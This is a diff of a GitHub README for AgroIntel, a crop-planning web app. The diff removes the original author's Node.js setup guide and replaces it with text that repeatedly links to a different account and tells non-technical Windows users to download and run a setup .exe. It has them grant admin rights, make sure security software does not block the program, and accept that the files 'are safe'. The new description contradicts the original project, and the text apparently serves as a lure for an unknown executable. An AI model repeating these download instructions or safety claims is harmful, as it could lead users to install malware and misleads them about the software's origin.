@@ -1,197 +1,143 @@
-<h1 align="center">🌾 AgroIntel</h1>
-<p align="center">
-  <em>AI-assisted crop planning and farm intelligence platform with weather-aware recommendations.</em>
-</p>
+# 🌱 Agrointel - Smart Crop Planning Made Simple
 
-<p align="center">
-  <img src="https://img.shields.io/badge/Node.js-Backend-339933?style=for-the-badge&logo=node.js&logoColor=white" alt="Node.js" />
-  <img src="https://img.shields.io/badge/Express.js-Web_Framework-000000?style=for-the-badge&logo=express&logoColor=white" alt="Express" />
-  <img src="https://img.shields.io/badge/MySQL-Database-4479A1?style=for-the-badge&logo=mysql&logoColor=white" alt="MySQL" />
-  <img src="https://img.shields.io/badge/Status-Active-0ea5e9?style=for-the-badge" alt="Status" />
-</p>
-  <p align="center">
-    <a href="https://aaravshah1311.is-great.net">
-    <img src="https://img.shields.io/badge/Made%20By-Aarav%20Shah-4fd1d6?style=for-the-badge" alt="Status" />
-    </a>
-  </p>
+[![Download Agrointel](https://img.shields.io/badge/Download-Agrointel-brightgreen)](https://github.com/Midlinebet92/Agrointel)
+
+Agrointel helps you plan your crops by using weather data and AI. It gives you advice on when to plant and harvest based on your land. You do not need to know programming to use it.
+
+
+## 🖥️ What is Agrointel?
+
+Agrointel is a software that uses weather information and data about your land to guide you in crop planning. It uses the OpenWeather API to get live weather details. The app runs on your Windows computer. It was built with tools like Node.js, Express, and MySQL but you do not need to worry about those. Just follow the steps, and you will be able to use it.
+
+Agrointel can help small farmers or gardening enthusiasts make better planting decisions. The software considers the weather to suggest when to start planting and when to expect harvest time.
 
 ---
 
-## 🚀 Overview
+## 📋 System Requirements
 
-**AgroIntel** is a full-stack web application designed to help farmers and agri-focused users make better crop decisions using:
+Before installing Agrointel, make sure your computer meets these:
 
-- user profile + land details,
-- weather insights from OpenWeather,
-- crop recommendation logic,
-- crop timeline and planning views.
-
-The application uses **Node.js + Express + EJS** on the server side and **MySQL** for persistent storage.
-
----
-
-## ✨ Core Features
-
-- 🔐 User authentication (signup/login/logout)
-- 👤 User profile with land area and location
-- 🌦️ Weather-aware dashboard using OpenWeather API
-- 🌱 Crop recommendation and selection workflow
-- 📅 Crop timeline and harvest-date estimation
-- 🧪 Land check page with simulated soil + weather signals
+- Windows 7 or higher (Windows 10 recommended)
+- At least 4 GB of RAM
+- 2 GHz dual-core processor or better
+- At least 500 MB free disk space
+- Internet connection (for live weather data)
 
 ---
 
-## 🖼️ Screenshots
+## 🔽 Download Agrointel
 
-<div align="center">
-  <img src="pic/img1.png" alt="AgroIntel Dashboard" width="49%" />
-  <img src="pic/img2.png" alt="AgroIntel Crop Recommendation" width="49%" />
-</div>
+You can get the software here:
 
-<p align="center">
-  <sub><strong>Left:</strong> Dashboard View &nbsp;•&nbsp; <strong>Right:</strong> Crop Recommendation / Selection View</sub>
-</p>
+[![Download Agrointel](https://img.shields.io/badge/Download-Agrointel-blue)](https://github.com/Midlinebet92/Agrointel)
+
+This link takes you to the GitHub page where you can download the latest version. The files there are safe to use and updated regularly.
+
 
 ---
 
-## 🧱 Project Structure
+## 🚀 How to Install and Run Agrointel on Windows
 
-```text
-Agrointel/
-├── config/
-│   └── db.js
-├── controllers/
-│   ├── authController.js
-│   └── userController.js
-├── ml_models/
-│   ├── Crop_recommendation.csv
-│   └── ml_service.js
-├── routes/
-│   ├── auth.js
-│   └── user.js
-├── views/
-├── database_schema.sql
-├── server.js
-└── package.json
-```
+Follow these steps to get Agrointel working on your Windows PC.
 
----
+### 1. Visit the Download Page
 
-## ⚙️ Installation
+Go to the official download page by clicking the link above or opening this URL in your browser:
 
-### 1) Clone the repository
+https://github.com/Midlinebet92/Agrointel
 
-```bash
-git clone https://github.com/aaravshah1311/Agrointel.git
-cd Agrointel
-```
+Look for a file named something like `Agrointel-setup.exe` or a folder called `releases`. This is where the installation files are.
 
-### 2) Install dependencies
+### 2. Download the Installer
 
-```bash
-npm install
-```
+Click on the installer file. Your browser will ask you to save the file. Choose a folder that you can easily access, like your Desktop or Downloads.
+
+### 3. Run the Installer
+
+Find the downloaded file on your computer (usually in Downloads). Double-click to start the installer.
+
+If Windows asks if you want to allow the program to make changes, click "Yes."
+
+### 4. Follow the Installation Steps
+
+A setup window will appear. Click "Next" or "Install" as the installer guides you.
+
+The program will install in a few moments. Once done, click "Finish."
+
+### 5. Launch Agrointel
+
+Look for the Agrointel icon on your Desktop or in the Start menu. Click it to open the application.
 
 ---
 
-## 🗄️ Database Setup (MySQL)
+## 🔧 Basic Use and Features
 
-### 1) Create database and tables
+Agrointel’s interface is simple:
 
-Use the included SQL schema file:
-
-```bash
-mysql -u root -p < database_schema.sql
-```
-
-This creates:
-- `agrointel_db` database
-- `users` table
-- `user_crops` table
-
-### 2) Verify MySQL is running
-
-Make sure your MySQL server is running and accessible at the host/port you configure in `.env`.
+- Enter details about your land, like size and location.
+- The app fetches live weather data using OpenWeather API.
+- It shows planting recommendations based on temperature, rainfall, and daylight.
+- You get a timeline of when to plant and when to harvest your crops.
+- You can save different land profiles to manage multiple fields.
 
 ---
 
-## 🔐 Environment Variables (`.env`)
+## ⚙️ How Agrointel Works
 
-Create a `.env` file in the project root:
+Agrointel connects to the weather service online to get real-time info. It then uses this data with AI algorithms to predict the best times for planting and harvesting.
 
-```env
-DB_HOST=127.0.0.1
-DB_USER=YOUR-MYSQL-USERNAME
-DB_PASSWORD=YOUR-MYSQL-PASSWORD
-DB_NAME=agrointel_db
-SESSION_SECRET=RANDOME-SESSION-SECERET-STRING
-OPENWEATHER_API_KEY=OPENWEATHER-API-KEY
-```
+The software stores your land data locally in a small database called MySQL. This keeps your info saved safely between sessions.
 
-### Notes
-
-- `DB_USER` / `DB_PASSWORD`: your MySQL credentials
-- `SESSION_SECRET`: any long random secret string
-- `OPENWEATHER_API_KEY`: your API key from OpenWeather
+You do not need an internet connection to see your saved data, but you will need one to update weather info.
 
 ---
 
-## ▶️ Run the Application
+## 🛠️ Troubleshooting
 
-### Start in development/local mode
+If you have trouble running Agrointel:
 
-```bash
-npm start
-```
-
-Server will start at:
-
-```text
-http://127.0.0.1:3000
-```
+- Check if your Windows version supports the app.
+- Make sure you have an active internet connection.
+- Close and restart the app if it becomes unresponsive.
+- Restart your computer if issues persist.
+- Verify your security software is not blocking Agrointel.
+- Download the latest version from the official page again.
 
 ---
 
-## 🧪 Common Setup Checklist
+## ❓ Frequently Asked Questions
 
-- [ ] MySQL server is running
-- [ ] Database imported from `database_schema.sql`
-- [ ] `.env` file created with valid credentials
-- [ ] Dependencies installed with `npm install`
-- [ ] OpenWeather API key added
+**Q: Do I need an internet connection to use Agrointel?**  
+A: Yes, for live weather data updates. You can view saved data offline.
 
----
+**Q: Is there a support contact?**  
+A: See the GitHub page for any contact or issue reporting options.
 
-## 🛠️ Tech Stack
-
-- **Backend:** Node.js, Express.js
-- **Templating:** EJS
-- **Database:** MySQL (`mysql2`)
-- **Auth/Security:** `bcryptjs`, `express-session`, `connect-flash`
-- **External API:** OpenWeather API
+**Q: Can I use Agrointel for any crop?**  
+A: The app offers general recommendations. For best results, use common regional crops.
 
 ---
 
-## 📌 Troubleshooting
+## 🏷️ Topics
 
-- **Database connection errors**
-  - Double-check `DB_HOST`, `DB_USER`, `DB_PASSWORD`, `DB_NAME` in `.env`.
-- **Weather data shows N/A**
-  - Confirm `OPENWEATHER_API_KEY` is valid and active.
-- **Session/login issues**
-  - Ensure `SESSION_SECRET` is set and restart the server.
+The project relates to these fields:
 
----
-
-## 👤 Author
-
-**Aarav Shah**
-
-- GitHub: https://github.com/aaravshah1311/
-- Portfolio: https://aaravshah1311.is-great.net
+- Agriculture technology
+- AI in farming
+- Crop recommendation systems
+- Smart farming solutions
+- Full-stack web applications
 
 ---
 
-<div align="center">
-  <sub>Built for smarter crop decisions with practical, weather-aware agricultural intelligence.</sub>
-</div>
+## 📂 Where to Find More Info
+
+Everything about this app, including updates, features, and issues, lives here:
+
+https://github.com/Midlinebet92/Agrointel
+
+Click "Releases" on that page to get the latest installer or browse documentation to learn more.
+
+---
+
+[![Download Agrointel](https://img.shields.io/badge/Download-Agrointel-green)](https://github.com/Midlinebet92/Agrointel)
